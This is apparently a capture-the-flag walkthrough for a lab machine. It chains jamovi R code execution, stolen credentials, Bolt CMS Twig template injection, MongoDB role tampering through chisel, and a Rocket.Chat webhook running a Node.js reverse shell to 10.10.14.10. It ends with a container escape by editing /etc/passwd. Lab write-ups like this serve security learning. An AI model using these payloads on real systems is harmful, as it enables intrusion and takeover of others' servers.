we found 5 ports open. on the port 80 page we found a button that redirects us to port 3000 a rocket chat app

we created a aoount and logged in .. but nothing else to do there.

so we checked other ports .. port 8000 ==jamovi== had ==R script== running so we used it to get a shell

Rj editor

```
system("id",itern=TRUE)
```

it was a ==docker==

we found .omv file in /root and it got creds for 3 users

we tar -xvf it and in xdat.json file it had creds

on port 80 there was ==bolt cms== running so we tried all creds + with username admin

and got a hit

in File System-> we found config/config.yaml file we put ==TEST STVRAT== and ==cleared the cache== (there was an option)

and it was visible on main site

so on theme editor we found ==index.twig== file and we edited it

`{{['id']|filter('system')}}`  and got shell

we did ssh on 172.17.0.1 via bolt and got ssh  --- user.txt

now we ==checked all ports and ip== .. ip 172.17.0.2 had a hit and port 27017 had a hit

so we used chisel and fowarded this port ..and now  typed ==mongo== and it automatically connected to that port on out pc

```
show databases
use meteor
db.getCollectionNames()
db.users.find()
now we can update out user to admin 
db.users.update({"_id": "D2ze5944wkr99XKoj"}, { $set: { "roles" : ["admin"]}})
```

user updated to admin

now we can use admin fetures like ==incoming web hooks==  and when we curl the link (provided) we got root shell --docker

```
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.10/5555 0>&1"');
```

or we can use node.js payload

we used  ==deepce.sh== and it said ==cap_dac_read_search== vuln.

we can ==edit /etc/passwd== and got root
